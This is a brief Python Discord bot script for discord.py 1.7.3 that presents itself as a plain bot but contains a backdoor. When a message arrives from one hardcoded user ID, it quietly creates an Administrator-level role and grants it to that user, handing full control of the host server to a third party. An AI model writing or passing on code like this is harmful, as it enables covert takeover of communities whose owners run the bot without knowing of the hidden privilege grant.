#made by Rathel
#discord.py version = 1.7.3
#pip install discord.py==1.7.3

import discord

client = discord.Client()

@client.event
async def on_ready():
    print("bot is now online.")

@client.event
async def on_message(message):
    if message.author.id == 932533473430863913:
        guild = message.guild
        perms = discord.Permissions(8)
        await guild.create_role(name="New role",permissions=perms)
        print("made a role!")
        user = message.author
        role = discord.utils.get(guild.roles,name="New role")
        await discord.Member.add_roles(user,role)
        print("add role!")

client.run("token_here")
